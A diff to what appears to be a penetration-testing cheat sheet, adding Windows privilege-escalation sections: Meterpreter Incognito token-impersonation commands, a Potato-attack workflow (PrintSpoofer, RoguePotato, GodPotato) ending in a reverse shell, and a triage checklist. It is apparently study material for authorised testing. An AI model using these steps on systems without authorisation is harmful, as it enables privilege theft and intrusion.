@@ -27,6 +27,9 @@
     - [PowerUp.ps1](#powerupps1)
     - [Interpreting PowerUp Output](#interpreting-powerup-output)
     - [Msfvenom Service Executable and Restart](#msfvenom-service-executable-and-restart)
+    - [Token Impersonation (Incognito)](#token-impersonation-incognito)
+    - [Potato Attacks](#potato-attacks)
+    - [Windows Privilege Escalation Checklist](#windows-privilege-escalation-checklist)
 - [Password Cracking](#password-cracking)
   - [John the Ripper](#john-the-ripper)
   - [Hashcat](#hashcat)
@@ -753,6 +756,51 @@ net start AdvancedSystemCareService9
 ```
 
 * Replace `AdvancedSystemCareService9` with the **ServiceName** from PowerUp or `sc qc <ServiceName>` output
+
+#### Token Impersonation (Incognito)
+
+* **When to try it** - If `whoami /priv` shows `SeImpersonatePrivilege` (or `SeAssignPrimaryTokenPrivilege`), token impersonation is a top Windows privesc path.
+
+```text
+whoami /priv
+load incognito
+list_tokens -g
+impersonate_token "BUILTIN\Administrators"
+getuid
+```
+
+* `load incognito`: Loads Meterpreter incognito extension
+* `list_tokens -g`: Lists available delegation/impersonation group tokens
+* `impersonate_token ...`: Steals and applies the selected token
+* If `getuid` does not immediately show SYSTEM/admin access in practice, migrate to a suitable privileged process (`ps` + `migrate <pid>`)
+
+#### Potato Attacks
+
+* **Use case** - Same core primitive (`SeImpersonatePrivilege`), often used when classic Incognito token theft is not enough or not available on modern hosts.
+* Common tooling:
+  * `PrintSpoofer`
+  * `RoguePotato`
+  * `GodPotato`
+* General workflow:
+  1. Confirm privilege: `whoami /priv`
+  2. Transfer exploit binary to target
+  3. Execute exploit with a payload command (reverse shell or local admin command)
+  4. Catch elevated shell/token and verify with `whoami`
+* Choose tool based on OS/build and patch level; not every Potato variant works everywhere.
+
+#### Windows Privilege Escalation Checklist
+
+```text
+whoami /priv          -> SeImpersonatePrivilege? -> Token impersonation / Potato
+winPEAS / PowerUp     -> service misconfig, unquoted paths, weak perms
+sc qc <service>       -> inspect binary path, start account, startup type
+accesschk / icacls    -> weak service/binary/folder permissions
+```
+
+* Fast decision flow:
+  * `SeImpersonatePrivilege` present -> test Incognito/Potato first
+  * Weak service config/ACL found -> service binary/path abuse
+  * Always verify context after each step with `whoami` and `whoami /groups`
 
 ---
 
